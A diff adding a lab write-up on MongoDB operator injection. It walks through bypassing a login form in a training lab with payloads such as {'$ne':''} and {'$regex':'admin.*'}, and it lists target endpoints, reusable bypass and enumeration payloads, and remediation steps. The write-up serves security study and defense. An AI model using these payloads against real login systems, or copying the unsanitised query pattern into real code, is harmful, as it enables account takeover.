@@ -161,3 +161,266 @@ Right-click response → **Show response in browser**
 - ✔ Don’t return unreleased data even if filters fail  
 
 ---
+
+# 🔥 **LAB-2 WRITE-UP — MongoDB Operator Injection (Login Bypass)**  
+
+---
+
+## 🔹 **ONE-LINE SUMMARY**
+
+MongoDB Operator Injection used to bypass authentication by inserting `$regex` and `$ne` operators into the JSON login fields, allowing login as **administrator without knowing the password**.
+
+---
+
+## 🔹 **WHAT IS THIS TOPIC ABOUT?**
+
+This lab demonstrates **NoSQL Operator Injection** — when user-controlled JSON is passed directly into a database query:
+
+```js
+db.users.findOne({ username: input.username, password: input.password })
+```
+
+If the application does **not sanitize** nested objects, attackers can insert:
+
+- `$ne` → *not equal*
+- `$regex` → *match by regex*
+- `$in`, `$gt`, `$lt` → *comparison operators*
+- `$where` → *JavaScript execution*
+
+This allows:
+
+✔ Login bypass  
+✔ Selecting specific users  
+✔ Privilege escalation  
+✔ Stealing admin sessions  
+✔ Complete authentication takeover  
+
+---
+
+## 🔹 **REAL-WORLD SCENARIO**
+
+This vulnerability is extremely common in:
+
+- Node.js + Express + MongoDB apps  
+- JSON-based login APIs  
+- Mobile backends (Android/iOS)  
+- GraphQL resolvers  
+- MERN stack projects  
+- MongoDB Atlas-hosted apps  
+- Student projects & startups  
+
+Common developer mistake:
+
+```js
+const user = await users.findOne(req.body);
+```
+
+If `req.body` contains operators → attacker fully controls the query.
+
+High-risk real cases:
+
+✔ Banking mobile apps  
+✔ E-commerce panels  
+✔ Admin dashboards  
+✔ Social apps  
+✔ Authentication microservices  
+
+---
+
+## 🔹 **HIGH-VALUE ENDPOINTS TO TEST**
+
+### 1. **Login endpoints**  
+```
+POST /login
+POST /auth
+POST /api/user/auth
+/sessions
+username
+password
+email
+reset-token
+/validate-username
+/search
+filter
+?category=
+```
+
+### 2. **User lookup / verify endpoints**  
+```
+POST /api/user/find
+POST /check-username
+```
+
+### 3. **JSON-driven search APIs**
+
+Especially where data is used as filters.
+
+### 4. **GraphQL login mutations**
+
+They often pass JSON straight into MongoDB.
+
+---
+
+## 🔹 **HOW THE ATTACK WORKS**
+
+1. Send JSON fields normally  
+2. Replace values with objects → `{"$ne":""}`  
+3. If login succeeds → operator injection confirmed  
+4. Use regex to force **admin** selection  
+5. Set password as `$ne` to bypass password check  
+6. Server logs attacker in as admin  
+
+MongoDB always returns the *first matching user*, which is often **administrator**.
+
+---
+
+## 🔹 **LAB WALKTHROUGH — EXACT STEPS**
+
+### **STEP 1 — Capture login request**
+
+Login with:
+
+```
+username: wiener
+password: peter
+```
+
+Send POST request to **Repeater**.
+
+---
+
+### **STEP 2 — Test operator injection on username**
+
+Replace:
+
+```json
+"username":"wiener"
+```
+
+with:
+
+```json
+"username":{"$ne":""}
+```
+
+➡ ✔ Successful login  
+➡ Confirms username field is vulnerable
+
+---
+
+### **STEP 3 — Test second operator: regex**
+
+Inject:
+
+```json
+"username":{"$regex":"wien.*"}
+```
+
+➡ ✔ Works  
+➡ Confirms server parses regex operators
+
+---
+
+### **STEP 4 — Test password operator**
+
+Set:
+
+```json
+"password":{"$ne":""}
+```
+
+➡ ✔ Login succeeds  
+➡ Both fields are vulnerable
+
+---
+
+### **STEP 5 — Final exploit → Log in as ADMIN**
+
+Use this payload:
+
+```json
+{
+  "username":{"$regex":"admin.*"},
+  "password":{"$ne":""}
+}
+```
+
+➡ ✔ Backend selects the admin account  
+➡ ✔ Password comparison bypassed  
+➡ ✔ Logged in as administrator  
+
+---
+
+### **STEP 6 — Open session in browser**
+
+Right-click → *Show response in browser*  
+Copy URL → Open in Burp → Login confirmed  
+
+Lab solved.
+
+---
+
+## 🔹 **TROUBLESHOOTING**
+
+| Problem | Cause | Fix |
+|--------|-------|-----|
+| Login fails | Invalid JSON | Close braces properly |
+| Operator ignored | Server expects string only | Ensure JSON body, not form data |
+| Regex does not match | Incorrect pattern | Use `"admin.*"` |
+| Nothing changes | Payload not parsed | Content-Type must be `application/json` |
+
+---
+
+## 🔹 **COMMON PAYLOADS (Real Pentesting)**
+
+### **Login bypass**
+```json
+{"username":{"$ne":""},"password":{"$ne":""}}
+```
+
+### **Login as admin**
+```json
+{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
+```
+
+### **Enumerate all usernames**
+```json
+{"username":{"$regex":".*"}}
+```
+
+### **Prefer admin (first match)**
+```json
+{"role":{"$ne":"user"}}
+```
+
+---
+
+## 🔹 **REMEDIATION (DEFENSE)**
+
+1. Strict schema validation (Zod / Joi)  
+2. Reject nested JSON in sensitive fields  
+3. Convert input → strings only  
+4. Disable parsing of `$ne`, `$regex`, `$where` etc.  
+5. Hash passwords (bcrypt)  
+6. Avoid passing user JSON into DB queries  
+7. Use allow-lists  
+8. Enforce secure authentication rules  
+9. Sanitize JSON before DB processing  
+
+---
+
+# 📸 **EVIDENCE — Final Payload Screenshot**
+
+### **Screenshot — Operator Injection Admin Login (Final Payload)**  
+![Admin credentials by operator manipulation](../images/5_operator_injection_admin_login.png)
+
+Shows successful login after applying:
+
+```json
+{
+  "username":{"$regex":"admin.*"},
+  "password":{"$ne":""}
+}
+```
+
+---
